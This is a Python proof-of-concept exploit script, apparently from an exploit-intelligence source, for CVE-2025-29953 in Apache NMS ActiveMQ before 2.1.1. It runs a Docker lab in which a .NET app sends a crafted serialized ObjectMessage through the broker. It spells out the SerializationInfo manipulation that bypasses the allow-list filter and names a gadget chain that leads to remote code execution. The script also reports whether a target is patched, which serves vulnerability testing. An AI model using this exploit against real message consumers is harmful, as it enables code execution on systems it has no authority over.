#!/usr/bin/env python3
# Exploit Title: Apache ActiveMQ NMS OpenWire < 2.1.1 - Broker-Based Filter Bypass (Vector 2)
# Exploit Author: Exploit Intelligence Platform (EIP)
# Vendor Homepage: https://activemq.apache.org/
# Version: Apache NMS ActiveMQ < 2.1.1
# Tested on: Apache NMS ActiveMQ 2.1.0 / .NET 6.0
# CVE: CVE-2025-29953
# Reference: https://exploit-intel.com
"""
PoC Vector 2 for CVE-2025-29953: Broker-Based End-to-End Attack

Demonstrates the full attack scenario: a malicious producer sends a crafted
ObjectMessage through an ActiveMQ broker, and the victim consumer deserializes
it, bypassing the allow/deny list filter.

Attack flow:
  1. Malicious producer connects to ActiveMQ broker
  2. Sends ObjectMessage containing MaliciousSerializable (ISerializable payload)
  3. Victim consumer receives the message from the queue
  4. Consumer accesses .Body, triggering BinaryFormatter.Deserialize()
  5. TrustedClassFilter.BindToType() is called:
     a. FormatterServices.GetTypeFromAssembly(mscorlib, "TrustedType, PocApp, ...") -> null
     b. IsTrustedType(destination, null) -> true (BUG: null type treated as trusted)
     c. BindToType returns null -> BinaryFormatter fallback resolves actual type
  6. Arbitrary type deserialized past the allow list -> RCE via gadget chains

This is the most realistic attack scenario - it demonstrates the network-level
attack where the attacker only needs producer access to a queue.

Usage:
    python3 poc_vector2.py [vulnerable_container] [broker_container]
"""

import subprocess
import sys
import time


DEFAULT_VULNERABLE_CONTAINER = "cve-2025-29953-vulnerable"
DEFAULT_BROKER_CONTAINER = "cve-2025-29953-broker"


def run_command(cmd, timeout=120):
    """Execute a command and return (returncode, stdout, stderr)."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except FileNotFoundError:
        return -2, "", f"Command not found: {cmd[0]}"


def check_container_running(container_name):
    """Verify the target container is running."""
    rc, stdout, _ = run_command(
        ["docker", "inspect", "--format", "{{.State.Running}}", container_name]
    )
    return rc == 0 and stdout.strip().lower() == "true"


def check_broker_health(broker_container):
    """Check if the ActiveMQ broker is healthy and accepting connections."""
    print(f"[*] Checking broker health ({broker_container})...")

    # Check if the OpenWire port (61616) is listening
    rc, stdout, _ = run_command([
        "docker", "exec", broker_container,
        "sh", "-c", "netstat -tlnp 2>/dev/null | grep 61616 || ss -tlnp | grep 61616 || echo 'PORT_CHECK_FAILED'"
    ])

    if "61616" in stdout:
        print("[+] Broker OpenWire port 61616 is listening.")
        return True

    # Fallback: try to connect with curl to web console
    rc, stdout, _ = run_command([
        "docker", "exec", broker_container,
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "http://localhost:8161/"
    ])

    if stdout.strip() in ("200", "302", "401"):
        print(f"[+] Broker web console responding (HTTP {stdout.strip()}).")
        return True

    print("[!] Broker may not be fully ready.")
    return False


def get_container_ip(container_name):
    """Get the container's IP address."""
    rc, stdout, _ = run_command(
        ["docker", "inspect", "--format",
         "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
         container_name]
    )
    if rc == 0 and stdout.strip():
        return stdout.strip().split("\n")[0]
    return None


def run_broker_exploit(vulnerable_container, broker_container):
    """
    Run the end-to-end broker-based attack.

    This test sends a crafted ObjectMessage through the ActiveMQ broker.
    The .NET PoC app acts as both the malicious producer (sends the payload)
    and the victim consumer (receives and deserializes it).

    In a real attack, the producer and consumer would be separate entities:
    - The attacker has access to send messages to a queue/topic
    - The victim application consumes messages from that queue/topic
    - The attacker sends a MaliciousSerializable payload
    - The victim's TrustedClassFilter fails to block it (null type bypass)
    """
    print()
    print("=" * 72)
    print("CVE-2025-29953: Broker-Based End-to-End Attack PoC")
    print("=" * 72)
    print()
    print("Attack Scenario:")
    print("  Attacker: Malicious producer with access to an ActiveMQ queue")
    print("  Victim:   NMS OpenWire client with restrictive allow list")
    print("  Broker:   Apache ActiveMQ Classic 5.18.6")
    print()
    print("Attack Flow:")
    print("  1. Attacker sends ObjectMessage with crafted ISerializable payload")
    print("  2. Payload uses GetObjectData() to manipulate SerializationInfo:")
    print("     - info.SetType(TrustedType)        -> records trusted type in stream")
    print("     - info.FullTypeName = AQN           -> assembly-qualified type name")
    print("     - info.AssemblyName = 'mscorlib'    -> redirect to wrong assembly")
    print("  3. Victim consumer receives message and accesses .Body property")
    print("  4. BinaryFormatter.Deserialize() calls TrustedClassFilter.BindToType()")
    print("  5. GetTypeFromAssembly(mscorlib, 'TrustedType, PocApp, ...') -> null")
    print("  6. IsTrustedType(dest, null) -> true  [CVE-2025-29953 BUG]")
    print("  7. BindToType returns null -> BinaryFormatter fallback resolves real type")
    print("  8. Arbitrary deserialization achieved -> RCE via gadget chains")
    print()
    print("-" * 72)
    print("Running broker-based attack...")
    print("-" * 72)
    print()

    # Execute the .NET PoC in 'broker' mode
    cmd = [
        "docker", "exec",
        vulnerable_container,
        "dotnet", "/app/PocApp.dll", "broker"
    ]

    rc, stdout, stderr = run_command(cmd, timeout=120)

    # Print the output
    if stdout:
        for line in stdout.rstrip().split("\n"):
            print(f"  {line}")
    if stderr:
        for line in stderr.rstrip().split("\n"):
            print(f"  [stderr] {line}")

    print()
    print("-" * 72)
    print("Result Analysis")
    print("-" * 72)
    print()

    vulnerable = False

    if rc == 0 and "VULNERABLE" in stdout:
        vulnerable = True
        print("[+] CONFIRMED: End-to-end broker-based attack succeeded!")
        print()
        print("    The MaliciousSerializable payload was sent through ActiveMQ and")
        print("    successfully deserialized on the consumer side, bypassing the")
        print("    TrustedClassFilter allow list via the null type exploit.")
        print()
        print("    In a real attack scenario:")
        print("    - The attacker only needs producer access to a queue/topic")
        print("    - The payload would contain a .NET gadget chain (e.g.,")
        print("      TypeConfuseDelegate -> Process.Start()) instead of a")
        print("      harmless TrustedType")
        print("    - Code execution would occur on the victim's machine with")
        print("      the privileges of the NMS client process")
    elif rc == 2:
        print("[-] PATCHED: The filter correctly blocked the message deserialization.")
    elif rc == 1 and "not found in assembly" in (stdout + stderr):
        # The fix in TrustedClassFilter.BindToType() throws SerializationException
        # when GetTypeFromAssembly() returns null, with message "Type ... not found in assembly ..."
        print("[-] PATCHED: TrustedClassFilter.BindToType() threw SerializationException.")
        print("    The fix correctly detects null type from GetTypeFromAssembly() and")
        print("    throws before BinaryFormatter can fall back to its own resolver.")
    elif rc == 1:
        print("[!] FAILED: Could not complete the broker-based test.")
        if "connect" in (stdout + stderr).lower():
            print("    Possible cause: Cannot connect to the ActiveMQ broker.")
    elif rc == -1:
        print("[!] ERROR: Command timed out.")
    else:
        print(f"[!] ERROR: Unexpected exit code {rc}")

    print()
    print(f"  Exit code: {rc}")
    print(f"  Status:    {'VULNERABLE' if vulnerable else 'NOT CONFIRMED'}")
    print()

    return 0 if vulnerable else 1


def main():
    vulnerable_container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_VULNERABLE_CONTAINER
    broker_container = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_BROKER_CONTAINER

    print(f"[*] CVE-2025-29953 PoC Vector 2 - Broker-Based End-to-End Attack")
    print(f"[*] Vulnerable container: {vulnerable_container}")
    print(f"[*] Broker container:     {broker_container}")
    print()

    # Step 1: Verify containers
    for name in [vulnerable_container, broker_container]:
        if not check_container_running(name):
            print(f"[!] Container '{name}' is not running.")
            print(f"    Start the lab: docker compose up -d")
            return 1
        print(f"[+] Container '{name}' is running.")

    # Step 2: Check broker health
    check_broker_health(broker_container)

    # Step 3: Show network info
    vuln_ip = get_container_ip(vulnerable_container)
    broker_ip = get_container_ip(broker_container)
    if vuln_ip:
        print(f"[*] Vulnerable container IP: {vuln_ip}")
    if broker_ip:
        print(f"[*] Broker container IP:     {broker_ip}")

    # Step 4: Run the exploit
    return run_broker_exploit(vulnerable_container, broker_container)


if __name__ == "__main__":
    sys.exit(main())
